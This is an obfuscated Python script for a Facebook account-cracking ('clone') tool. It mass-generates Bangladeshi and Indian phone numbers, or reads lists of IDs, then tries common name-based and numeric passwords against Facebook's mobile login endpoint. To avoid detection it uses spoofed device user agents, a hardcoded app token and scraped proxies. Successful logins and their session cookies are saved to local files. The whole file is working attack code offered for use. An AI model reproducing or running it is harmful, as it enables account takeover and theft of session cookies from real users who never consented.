import os ,random #line:2
import sys ,time ,uuid #line:3
try :#line:4
    import requests ,bs4 ,mechanize ,httpx #line:5
    import rich ,json ,subprocess ,random ,string #line:6
    from concurrent .futures import ThreadPoolExecutor as ThreadPool #line:7
except ModuleNotFoundError :#line:8
    print ('\x1b[38;5;46m[\x1b[1;97m≈\x1b[38;5;46m] MODULE INSTALLING ')#line:9
    os .system ('pip install requests rich')#line:10
    os .system ('pip install mechanize')#line:11
    os .system ('pip install bs4 httpx')#line:12
try :#line:14
    prox =requests .get ('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=1000&country=all&ssl=all&anonymity=all').text #line:15
    open ('.prox.txt','w').write (prox )#line:16
except Exception as e :#line:17
    pass #line:18
prox =open ('.prox.txt','r').read ().splitlines ()#line:19
loop ,ok ,cp ,user =0 ,[],[],[]#line:21
cok ,plist =[],[]#line:22
A ='\x1b[1;97m'#line:24
R ='\x1b[38;5;196m'#line:25
Y ='\033[1;33m'#line:26
G ='\x1b[38;5;48m'#line:27
B ='\x1b[38;5;8m'#line:28
G1 ='\x1b[38;5;46m'#line:29
G2 ='\x1b[38;5;47m'#line:30
G3 ='\x1b[38;5;48m'#line:31
G4 ='\x1b[38;5;49m'#line:32
G5 ='\x1b[38;5;50m'#line:33
X ='\33[1;34m'#line:34
X1 ='\x1b[38;5;14m'#line:35
X2 ='\x1b[38;5;123m'#line:36
X3 ='\x1b[38;5;122m'#line:37
X4 ='\x1b[38;5;86m'#line:38
X5 ='\x1b[38;5;121m'#line:39
S ='\x1b[1;96m'#line:40
M ='\x1b[38;5;205m'#line:41
def linex ():#line:43
    print (f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')#line:44
def clear ():#line:45
        os .system (f'clear')#line:46
        print (logo )#line:47
def CEN ():#line:49
	O0OO00000OO0O0O0O =f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"#line:50
	OO0000O0OO000O000 =str (random .randint (10000000 ,66666666 ))#line:51
	OOO00OO0OOOO00O0O =str (random .randint (000000000 ,999999999 ))#line:52
	O000O0OO0O00O000O =random .choice (['2.0','2.5','3.0'])#line:53
	O000OO00000OO00OO =random .choice (["720","1080","1280"])#line:54
	O00OOOO00000OOO00 =random .choice (["720","1080","1280","1440","1920"])#line:55
	O00000OO0OOOO0OOO =f"[FBAN/FB4A;FBAV/{str(O0OO00000OO0O0O0O)};FBBV/{str(OO0000O0OO000O000)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={O000O0OO0O00O000O},width={O000OO00000OO00OO},height={O00OOOO00000OOO00}}};FBLC/en_US;FBRV/{str(OOO00OO0OOOO00O0O)};FBCR/MTN-CG;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_X01BDA;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]"#line:56
	return O00000OO0OOOO0OOO #line:57
logo =(f"""
       {G1}███████ {Y}████████ {M}███    ██ {S}█████████
       {G2}██      {Y}██       {M}██ █   ██ {S}   ██    
       {G3}██      {Y}████████ {M}██  █  ██ {S}   ██    
       {G4}██      {Y}██       {M}██   █ ██ {S}   ██    
       {G5}███████ {Y}████████ {M}██    ███ {S}   ██    
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G1}[{A}≈{G1}]{G1} DEVELOPER {A}➢{G1} CENT
{G1}[{A}≈{G1}]{G1} TOOLTYPE  {A}➢{G1} FILE {A}&{G1} RANDOM CLONE
{G1}[{A}≈{G1}]{G1} VERSION   {A}➢{A} V{G1}/{A}0.1
{G1}[{A}≈{G1}]{G1} STATUS    {A}➢{A} PRIVATE
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")#line:70
def menu ():#line:72
    clear ()#line:73
    print (f'{G1}[{A}1{G1}]{G1} FILE CLONE ')#line:74
    print (f'{G1}[{A}2{G1}]{G1} RANDOM CLONE ')#line:75
    print (f'{G1}[{A}3{G1}]{G1} CONTACT OWNER ')#line:76
    print (f'{G1}[{A}0{G1}]{G1} EXIT TOOL ')#line:77
    linex ()#line:78
    OO00OOO0OOOOO0O0O =input (f'{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ')#line:79
    if OO00OOO0OOOOO0O0O in ['1']:#line:80
        file ()#line:81
    elif OO00OOO0OOOOO0O0O in ['2']:#line:82
        tsu ()#line:83
    elif OO00OOO0OOOOO0O0O in ['3']:#line:84
        os .system ('xdg-open https://www.facebook.com/CenT.aep');menu ()#line:85
    elif OO00OOO0OOOOO0O0O in ['0']:#line:86
        sys .exit ()#line:87
    else :#line:88
        menu ()#line:89
def tsu ():#line:91
    clear ()#line:92
    print (f'{G1}[{A}1{G1}]{G1} BANGLADESH CLONE')#line:93
    print (f'{G1}[{A}2{G1}]{G1} INDIA CLONE')#line:94
    print (f'{G1}[{A}0{G1}]{G1} BACK MENU');linex ()#line:95
    OOOO0OO0O00O0OOO0 =input (f'{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ')#line:96
    if OOOO0OO0O00O0OOO0 in ['1']:#line:97
        bd ()#line:98
    elif OOOO0OO0O00O0OOO0 in ['2']:#line:99
        India ()#line:100
    elif OOOO0OO0O00O0OOO0 in ['0']:#line:101
    	menu ()#line:102
    else :#line:103
        tsu ()#line:104
def bd ():#line:106
    clear ()#line:107
    print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 099{G}/{A}094{G}/{A}091{G}/{A}095');linex ()#line:108
    OOOO00O000OO00OOO =input (f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} ')#line:109
    clear ()#line:110
    print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 3000{G}/{A}5000{G}/{A}10000{G}/{A}99999');linex ()#line:111
    O00OO00O0O00OOOOO =int (input (f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '))#line:112
    for OOOO00000OO00O0OO in range (O00OO00O0O00OOOOO ):#line:113
        OO000OOOOO00O00OO ="".join (random .choice (string .digits )for _O00O00OO0O0O00O0O in range (8 ))#line:114
        user .append (OO000OOOOO00O00OO )#line:115
    clear ()#line:116
    with ThreadPool (max_workers =30 )as OOO000OO00O00OOOO :#line:117
        clear ()#line:118
        print (f'{G1}[{A}≈{G1}]{G1} SIM CODE  {A}➢{A} {OOOO00O000OO00OOO}')#line:119
        print (f'{G1}[{A}≈{G1}]{G1} TOTAL UID {A}➢{A} {str(len(user))}')#line:120
        print (f"{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN");linex ()#line:121
        for OO0OOO0O0OOO00000 in user :#line:122
            OO0OO00O000O000O0 =OOOO00O000OO00OOO +OO0OOO0O0OOO00000 #line:123
            OOO0000OOO000OOOO =OO0OO00O000O000O0 [:8 ]#line:124
            O00OO000O000O000O =OO0OO00O000O000O0 [:7 ]#line:125
            OOO00OOO00O0OOOOO =OO0OO00O000O000O0 [:6 ]#line:126
            O00OO000O00OO0OOO =OO0OOO0O0OOO00000 [1 :]#line:127
            O0OOO000OO000O00O =OO0OOO0O0OOO00000 [2 :]#line:128
            O00OO00000O0O00O0 =[OO0OO00O000O000O0 ,OO0OOO0O0OOO00000 ,OOO0000OOO000OOOO ,O00OO000O000O000O ,OOO00OOO00O0OOOOO ,O00OO000O00OO0OOO ,O0OOO000OO000O00O ,'77889900','bangladesh','bangla','jannat','jannatul','mariya','sadiya','farjana','sabbir','rakibul','mahidul','nusrat','tamanna','mimmim','suraiya','alamin','arafat','bushra','roksana','tabassum','tanisha','tasnim']#line:129
            OOO000OO00O00OOOO .submit (randm ,OO0OO00O000O000O0 ,O00OO00000O0O00O0 )#line:130
    print ('')#line:131
    print (f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')#line:132
    print (f'{G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')#line:133
    print (f'{G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')#line:134
    print (f'{G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')#line:135
    print (f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')#line:136
    input (f'{G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')#line:137
    menu ()#line:138
def India ():#line:140
    clear ()#line:141
    print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} +91639{G}/{A}+91934{G}/{A}+91902{G}/{A}+91701');linex ()#line:142
    O000OOO0OO00OOOOO =input (f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} ')#line:143
    clear ()#line:144
    print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 3000{G}/{A}5000{G}/{A}10000{G}/{A}99999');linex ()#line:145
    O0OOO000OO00O00OO =int (input (f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '))#line:146
    for OOOO0OOO000O000OO in range (O0OOO000OO00O00OO ):#line:147
        OO000OOOO0O0O0OOO ="".join (random .choice (string .digits )for _OOO0000OOOO00OO0O in range (7 ))#line:148
        user .append (OO000OOOO0O0O0OOO )#line:149
    clear ()#line:150
    with ThreadPool (max_workers =30 )as O0O0OO00000OOO00O :#line:151
        clear ()#line:152
        print (f'{G1}[{A}≈{G1}]{G1} SIM CODE  {A}➢{A} {O000OOO0OO00OOOOO}')#line:153
        print (f'{G1}[{A}≈{G1}]{G1} TOTAL UID {A}➢{A} {str(len(user))}')#line:154
        print (f"{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN");linex ()#line:155
        for O00OO0000000O0OOO in user :#line:156
            O0O0OOOO00O0OOOOO =O000OOO0OO00OOOOO +O00OO0000000O0OOO #line:157
            O0000000000OO0OOO =[O00OO0000000O0OOO ,O0O0OOOO00O0OOOOO [:8 ],'57273200','59039200','57575751']#line:158
            O0O0OO00000OOO00O .submit (randm ,O0O0OOOO00O0OOOOO ,O0000000000OO0OOO )#line:159
    print ('')#line:160
    print (f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')#line:161
    print (f'{G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')#line:162
    print (f'{G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')#line:163
    print (f'{G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')#line:164
    print (f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')#line:165
    input (f'{G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')#line:166
    menu ()#line:167
def file ():#line:169
    clear ()#line:170
    print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} /{A}sdcard{G1}/{A}SWAG.txt');linex ()#line:171
    O0000O0OOOOOO0O0O =input (f'{G1}[{A}?{G1}]{G1} FILE NAME {A}➢{G1} ')#line:172
    try :#line:173
        OO0O00OO0OOOO0O00 =open (O0000O0OOOOOO0O0O ,'r').read ().splitlines ()#line:174
    except FileNotFoundError :#line:175
        print (f'{G1}[{A}≈{G1}]{G1} FILE NOT FOUND');time .sleep (1 )#line:176
        O0000O0OOOOOO0O0O ()#line:177
    clear ()#line:178
    print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} {G1}[{A}1-20{G1}]{G1}');linex ()#line:179
    O00OO000O0O0O000O =int (input (f'{G1}[{A}?{G1}]{G1} PASSWORD LIMIT {A}➢{G1} '))#line:180
    clear ()#line:181
    for O0O0OO00OOOO0OOO0 in range (O00OO000O0O0O000O ):#line:182
        print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} firstlast{G1}/{A}first123{G1}/{A}last123')#line:183
        plist .append (input (f'{G1}[{A}?{G1}]{G1} PASSWORD NO {G1}[{A}{O0O0OO00OOOO0OOO0+1}{G1}]{G1} {A}➢{S} '));linex ()#line:184
    with ThreadPool (max_workers =30 )as O0O00000OO00O0O0O :#line:185
        OO0OO0O000O00OOOO =str (len (OO0O00OO0OOOO0O00 ))#line:186
        clear ()#line:187
        print (f'{G1}[{A}≈{G1}]{G1} TOTAL ID {A}➢{G1} {OO0OO0O000O00OOOO}')#line:188
        print (f"{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN");linex ()#line:189
        for OOOOO0O00OOO00O00 in OO0O00OO0OOOO0O00 :#line:190
            O00OO00OO00OO0O00 ,O0OO0OO00000OO000 =OOOOO0O00OOO00O00 .split ('|')#line:191
            OOO00O00OOOO0O0OO =plist #line:192
            O0O00000OO00O0O0O .submit (M1 ,O00OO00OO00OO0O00 ,O0OO0OO00000OO000 ,OOO00O00OOOO0O0OO )#line:193
    print ('')#line:194
    print (f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')#line:195
    print (f'{G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')#line:196
    print (f'{G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')#line:197
    print (f'{G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')#line:198
    print (f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')#line:199
    input (f'{G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')#line:200
    menu ()#line:201
def randm (OOO0OOOO0O00OOO00 ,OO00OO0OOOOOO00O0 ):#line:203
    global loop ,ok #line:204
    O00O00000OO000O00 =random .choice (prox )#line:205
    OO00O00OO000O00OO ={'http':'socks4://'+O00O00000OO000O00 }#line:206
    sys .stdout .write (f'\r\r{A}[{G1}SWAG-XD{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')#line:207
    sys .stdout .flush ()#line:208
    try :#line:209
        for OO0O0OO0O0O000OOO in OO00OO0OOOOOO00O0 :#line:210
            O0OO00O0OO0O0O000 ={'adid':str (uuid .uuid4 ()),'format':'json','device_id':str (uuid .uuid4 ()),'email':OOO0OOOO0O00OOO00 ,'password':OO0O0OO0O0O000OOO ,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str (uuid .uuid4 ()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}#line:231
            OO0O00OO0O0O00OO0 ={'User-Agent':CEN (),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str (random .randint (2e4 ,4e4 )),'X-FB-SIM-HNI':str (random .randint (2e4 ,4e4 )),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'MOBILE.LTE','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}#line:249
            OOO000O0O00OO00O0 ='https://b-graph.facebook.com/auth/login'#line:250
            OOO0OOOOO0O0O0000 =requests .post (OOO000O0O00OO00O0 ,data =O0OO00O0OO0O0O000 ,headers =OO0O00OO0O0O00OO0 ,allow_redirects =False ).text #line:251
            OO00OO00O0OOOOOO0 =json .loads (OOO0OOOOO0O0O0000 )#line:252
            if 'access_token'in OO00OO00O0OOOOOO0 :#line:253
                OO0O000OO0000OO0O =str (OO00OO00O0OOOOOO0 ['uid'])#line:254
                OOOOOOO000O00O0O0 =";".join (OO00O00O00000O0O0 ["name"]+"="+OO00O00O00000O0O0 ["value"]for OO00O00O00000O0O0 in OO00OO00O0OOOOOO0 ["session_cookies"])#line:255
                if res =='LIVE':#line:256
                	print (f'\r\r{A}[{G1}CENT-OK{A}]{G1} {OO0O000OO0000OO0O} {A}|{G1} {OO0O0OO0O0O000OOO}');open ('/sdcard/CENT-FILE-OK.txt','a').write (OO0O000OO0000OO0O +'|'+OO0O0OO0O0O000OOO +'|'+OOOOOOO000O00O0O0 +'\n');ok .append (OO0O000OO0000OO0O );break #line:257
                if res =='LOCK':#line:258
                	print (f'\r\r{A}[{S}CENT-PODLOCK{A}]{S} {OO0O000OO0000OO0O} {A}|{S} {OO0O0OO0O0O000OOO}');break #line:259
            else :continue #line:260
        loop +=1 #line:261
    except Exception as OO0O000O000O0OOOO :#line:262
        pass #line:263
def M1 (OO0000OOOOOO00OOO ,O0OOO00OOO000OO0O ,OO000O000OOO0OO00 ):#line:265
    global loop ,ok #line:266
    OOO0OOOOO00O00OO0 =random .choice (prox )#line:267
    OO0O0O00000O0OO0O ={'http':'socks4://'+OOO0OOOOO00O00OO0 }#line:268
    sys .stdout .write (f'\r\r{A}[{G1}CENT-XD{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')#line:269
    sys .stdout .flush ()#line:270
    try :#line:271
        O0O0O0O0OOO0O0OOO =O0OOO00OOO000OO0O .split (' ')[0 ]#line:272
        try :OOOO0O0OOO0O00O00 =O0OOO00OOO000OO0O .split (' ')[1 ]#line:273
        except :OOOO0O0OOO0O00O00 =O0O0O0O0OOO0O0OOO #line:274
        for O00OO0O0OOOO00O00 in OO000O000OOO0OO00 :#line:275
            O0O0OOOO00OOOO000 =O00OO0O0OOOO00O00 .replace ('first',O0O0O0O0OOO0O0OOO .lower ()).replace ('First',O0O0O0O0OOO0O0OOO ).replace ('last',OOOO0O0OOO0O00O00 .lower ()).replace ('Last',OOOO0O0OOO0O00O00 ).replace ('Name',O0OOO00OOO000OO0O ).replace ('name',O0OOO00OOO000OO0O .lower ())#line:276
            O0O00O000000OO000 ={'adid':str (uuid .uuid4 ()),'format':'json','device_id':str (uuid .uuid4 ()),'email':OO0000OOOOOO00OOO ,'password':O0O0OOOO00OOOO000 ,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str (uuid .uuid4 ()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}#line:297
            O0000OOO0OO0000O0 ={'User-Agent':CEN (),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str (random .randint (2e4 ,4e4 )),'X-FB-SIM-HNI':str (random .randint (2e4 ,4e4 )),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'MOBILE.LTE','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}#line:315
            OO00O0000OOO0O0O0 =requests .post ('https://b-graph.facebook.com/auth/login',data =O0O00O000000OO000 ,headers =O0000OOO0OO0000O0 ).json ()#line:316
            if 'access_token'in OO00O0000OOO0O0O0 :#line:317
                print (f'\r\r{A}[{G1}CEN-OK{A}]{G1} {OO0000OOOOOO00OOO} {A}|{G1} {O0O0OOOO00OOOO000}')#line:318
                OO000O00OO0OO0OOO =";".join (OOOOO00000O0OO0O0 ["name"]+"="+OOOOO00000O0OO0O0 ["value"]for OOOOO00000O0OO0O0 in OO00O0000OOO0O0O0 ["session_cookies"])#line:319
                open ('/sdcard/CEN-FILE-OK.txt','a').write (uid +'|'+O0O0OOOO00OOOO000 +'|'+OO000O00OO0OO0OOO +'\n')#line:320
                ok .append (OO0000OOOOOO00OOO )#line:321
                break #line:322
            elif 'www.facebook.com'in OO00O0000OOO0O0O0 ['error']['message']:#line:323
                open ('/sdcard/CEN-FILE-PODLOCK.txt','a').write (OO0000OOOOOO00OOO +'|'+O0O0OOOO00OOOO000 +'\n')#line:325
            else :continue #line:326
        loop +=1 #line:327
    except Exception as OO00O0000OO000000 :#line:328
        pass #line:329
if __name__ =='__main__':#line:330
    menu ()#line:331
